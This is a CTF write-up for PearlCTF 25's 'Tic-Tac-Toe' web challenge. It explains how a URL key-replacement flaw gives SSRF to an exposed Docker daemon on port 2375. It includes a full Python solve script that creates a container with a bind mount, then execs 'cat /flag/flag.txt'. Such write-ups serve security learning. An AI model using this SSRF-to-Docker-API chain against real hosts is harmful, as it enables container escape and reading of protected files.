---
title: "PearlCTF 25 - Web/Tic-Tac-Toe"
date: 2025-03-08T22:13:34+01:00
tags: ["ctf", "write-up", "pearl"]
author: "hxuu"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "CTF write-up for Ttt"
summary: ""
canonicalURL: ""
disableHLJS: false
disableShare: false
hideSummary: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "/images/default-cover.jpg" # default image path/url
    alt: "CTF Write-up Cover Image" # alt text
    caption: "CTF Write-up" # display caption under cover
    relative: false
    hidden: false
editPost:
    URL: "https://github.com/hxuu/content"
    Text: "Suggest Changes"
    appendFilePath: true
---

![challenge-description](/blog/images/2025-03-09-21-56-22.png)
Challenge attachments and code [here](https://pearlctf.in/files/tic-tac-toe.zip)

## 1. Challenge overview

After starting the instance of the challenge, we're faced with what looks like a tic tac toe
game over a web front. As we can see below, we can deploy and ping the game server, then click on
the squares to send an HTTP request to the game server containing our game state.

-- image here (ping)
-- image here (sending the game state)

Since the UI doesn't give away much of the web application's logic, let's dive into the source code
to see how the latter works, namely, what endpoints are there and which of those can we tamper with.

> My approach in analyzing code is having a top to bottom approach. I start with the `Dockerfile`,
> move to application main logic, then utilities if they exist.

---

### `Dockerfile`

```Dockerfile
FROM python:3.9-alpine

RUN apk add --no-cache docker-cli

WORKDIR /app

COPY requirements.txt .

RUN pip install -r requirements.txt

COPY ./templates ./templates
COPY app.py .
COPY url.py .
COPY flag.txt /flag/

ENV DOCKER_HOST="tcp://localhost:2375"
ENV GAME_API_DOMAIN="localhost"
ENV GAME_API_PORT="8000"

CMD ["gunicorn", "--bind", "0.0.0.0:80", "app:app", "--capture-output", "--log-level", "debug"]
```

As you can see, we start with a alpine linux image that has python installed. Move
our application code inside the container, and the flag.txt file into /flag/ directory.

We set few environment variables and run the application. Funnily enough, during the CTF,
I didn't know what the `DOCKER_HOST` env variable meant, but as you'll see, it'll be our main
attack vector.

### `app.py`

```python
from flask import Flask, render_template, request, jsonify
import requests, json
import url
import subprocess
import logging

app = Flask(__name__)
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

def wrap_response(resp):
    try:
        parsed = json.loads(resp)
    except json.JSONDecodeError:
        parsed = resp

    return {"body": parsed}

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/deploy")
def deploy():
    container_inspect = subprocess.run(["docker", "inspect", "game"], stdout=subprocess.PIPE)
    resp = json.loads(container_inspect.stdout)

    if len(resp) > 0:
        return jsonify({"status": 1})

    docker_cmd = ["docker", "run", "--rm", "-d", "-p", "8000:8000", "--name", "game", "b3gul4/tic-tac-toe"]
    subprocess.run(docker_cmd)

    return jsonify({"status": 0})

@app.route("/")
def game():
    return render_template("index.html")

@app.post("/")
def play():
    game = url.get_game_url(request.json)

    if game["error"]:
        return jsonify({"body": {"error": game["error"]}})

    try:
        if game["action"] == "post":
            resp = requests.post(game["url"], json=request.json)
            if resp.status_code < 200 or resp.status_code >= 300:
                logger.debug(resp.text)
                return jsonify({"body": {"error": "there was some error in game server"}})
        else:
            resp = requests.get(game["url"])
            if resp.status_code < 200 or resp.status_code >= 300:
                logger.debug(resp.text)
                return jsonify({"body": {"error": "there was some error in game server"}})

    except Exception as e:
        return jsonify({"body": {"error": "game server down"}})

    return jsonify(wrap_response(resp.text))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
```

This is a Flask application that has 2 endpoints: root (/) and /deploy.

1. /deploy: The code here creates the game docker container. At first, it checks whether a docker
container by the name `game` is existant or not. Then, it runs a container based off of `b3gul4/tic-tac-toe` image.

> It should be noted that docker-cli was installed in the Dockerfile, that's why we can run commands inside the container.

2. root (/): This one is interesting. Unlike the deploy endpoint which we can't control. It seems
like the / endpoint accepts a POST request which ultimately (after url checking) visits a url
that is supplied by us.

Now we start to get an idea of how the application works. We can MAYBE make requests, but first we have
to overcome the line of defense put by the application. Let's check `url.py`

### `url.py`

```python
import os

URL = "http://<domain>:<port>/<game_action>"

def is_valid_state(state):
    if len(state) != 9:
        return False

    for s in state:
        if s not in ["X", "O", "_"]:
            return False

    return True

def get_game_url(req_json):
    try:
        api = req_json["api"]
        keys = list(api.keys())

        url = URL.replace("<domain>", os.getenv("GAME_API_DOMAIN"))
        url = url.replace("<port>", os.getenv("GAME_API_PORT"))
        # The game api is going to have many more endpoints in future, I do not want to hardcode the action
        url = url.replace(keys[0], api[keys[0]])

        if not is_valid_state(req_json["state"]):
            return {"url": None, "action": None, "error": "Invalid state"}

        return {"url": url, "action": req_json["action"], "error": None}

    except Exception as e:
        print(e)
        return {"url": None, "action": None, "error": "Internal server error"}
```

The function `get_game_url` (the one in app.py) attempts to sanitize our user input. It does so as follows:

1. takes input like this:

```json
{
    'api': X,
    'state': Y,
    'action': Z
}
```

2. extracts a list of keys from the api. This suggests that X is actually an object of key-value pairs. like this:

```json
{
    "api": {  "key1": "value1", "key2": "value2"...etc },
    "state": Y,
    "action": Z
}
```

3. After that, it crafts a `url` from `http://<domain>:<port>/<game_action>` by doing a series of substitutions as follows:

    3.1. replace `<domain>` and `<port>` with predefined values (not very useful to us)

    3.2. replace `key1` with `value1` from our input json!!!

Now THIS, is very interesting. We can tamper with the URL however we want. Say:

```bash
url = http://localhost:8000/<game_action>
```
and
```bash
key1 = localhost:8000/<game_action> and value1 = example.com
```

The generated url is `http://example.com`. Completely controllable by us!

Is this enough though? Well, not quite so, we need to ensure that 'state' verifies the condition put as well.
That's easy, just set it to 9 Os or 9 Xs

```json
{
    "api": {  "key1": "value1", "key2": "value2"...etc },
    "state": "XXXXXXXXX",
    "action": "get" //or post if we want to trigger the post section of the request handler
}
```

This way, we can make requests yes, but how can we retrieve the flag?

Here comes the `DOCKER_HOST` environment variable.

---

Docker is an containerization technology, ie not quite like VM, but behaves in a way
that makes the processes running inside the container isolated from the host machine.

The process responsible for managing all of this is the [**docker daemon**](https://docs.docker.com/reference/cli/dockerd/#daemon-socket-option), better known as `dockerd`.
It's a persistent background process that acts as a [runtime](https://stackoverflow.com/questions/3900549/what-is-runtime) that manages docker objects, ie images, containers...etc.

Docker dameon listens for REST API requests, which are HTTP requests, and as we know, HTTP
is built on top of TCP, and where does the latter word appear in our application? That's right! in the Dockerfile:

```Dockerfile
ENV DOCKER_HOST="tcp://localhost:2375"
```

How is this information useful you ask? Well, let's say that exposing your docker daemon brings deamons.
The kind that lets us interact with the host machine and create, start, stop, execute any docker command we like.

## 2. Task Analysis

The challenge overview was long I know, but now we know what we have to do. Since we think that dockerd
is exposed through the network, we first should make an HTTP request to `http://localhost:2375/info` to verify our assumption.

```python
import requests

url = 'http://localhost:80'
# url = 'https://tic-tac-toe-c8ae075ea3c02b7e.ctf.pearlctf.in'
payload = {
    'api': {"8000/<game_action>": "2375/info"},
    'state': "_________",
    'action': 'get',
}
info = requests.post(url, json=payload).json()
print(info)
```

> I'll leave the burden of understand my script to you. You have all the pieces you need.

![system-info](/blog/images/2025-03-09-22-53-14.png)

Nice! We confirmed our assumption. We can move to the next step, which is retrieving the flag.

---

To get the flag, the simplest we can do is create a container using the already existing image.
Mout the host filesystem into this newly created container, and just cat-ing out the flag.txt file.

## 3. Solution

All the steps mentioned above are below on this script:

### `solve.py`

```python
#!/usr/bin/env python3

import requests

url = 'http://localhost:80'
# url = 'https://tic-tac-toe-c8ae075ea3c02b7e.ctf.pearlctf.in'


# step 0: create a new container that the flag.txt is mounted on
payload = {
    'state': "_________",
    'api': {"8000/<game_action>": "2375/containers/create"},
    'action': 'post',
    "Image": "b3gul4/tic-tac-toe",
    "HostConfig": {
        "Binds": ["/flag:/flag:ro"]
    }
}
container_info = requests.post(url, json=payload).json()
container_id = container_info['body']['Id']
print(container_id)

# step 1.0: start the container
payload = {
    'state': "_________",
    'api': {"8000/<game_action>": f"2375/containers/{container_id}/restart"},
    'action': 'post',
}
start_data = requests.post(url, json=payload).json()
print(start_data)
# exit()

# # step 1.1: check if it's up (optional)
# payload = {
#     'state': "_________",
#     'api': {"8000/<game_action>": f"2375/containers/{container_id}/logs?stdout=true&stderr=true"},
#     'action': 'get',
# }
# containers = requests.post(url, json=payload).json()
# print(containers)
# exit()
# container_id = containers['body'][0]['Id']
# print(container_id)

print('==========================================================')

# step 2: create an exec session to get the flag
# wished payload: {"AttachStdout": True, "AttachStderr": True, "Tty": False, "Cmd": ["cat", "/flag/flag.txt"]}
payload = {
    'state': "_________",
    'api': {"8000/<game_action>": f"2375/containers/{container_id}/exec"},
    'action': 'post',
    "AttachStdout": True, "AttachStderr": True, "Tty": False, "Cmd": ["cat", "/flag/flag.txt"]
}
exec_data = requests.post(url, json=payload).json()
# print(exec_data.json())
exec_id = exec_data['body']['Id']
# print(exec_id)
# exit()

print('==========================================================')


# step 3: start the session to actually get the flag
# wished payload: {"Detach": False, "Tty": False}
payload = {
    'state': "_________",
    'api': {"8000/<game_action>": f"2375/exec/{exec_id}/start"},
    'action': 'post',
    "Detach": False, "Tty": False
}
resp = requests.post(url, json=payload)
# flag = extract_flag(resp)  # Assuming 'response' holds the raw output
print(resp.json())  # This should print the actual flag
```

![flag-picture](/blog/images/2025-03-09-23-04-59.png)

---

And there we go~ Flag is: `pearl{do_y0u_r34llY_kn0w_d0ck3r_w3ll?}`

If you're interested in learning more about the challenge, here are some additional reads:

1. [Container Vulnerabilities|Part 2](https://medium.com/@iramjack8/container-vulnerabilities-part-2-3e3ae8c07934)
2. [Attacker’s Tactics and Techniques in Unsecured Docker Daemons Revealed](https://unit42.paloaltonetworks.com/attackers-tactics-and-techniques-in-unsecured-docker-daemons-revealed/)
3. [What is Docker?](https://docs.docker.com/get-started/docker-overview/#the-docker-client)
4. [dockerd]([https://docs.docker.com/reference/cli/dockerd/#daemon-socket-option])
5. [Configure remote access for Docker daemon](https://docs.docker.com/engine/daemon/remote-access/)

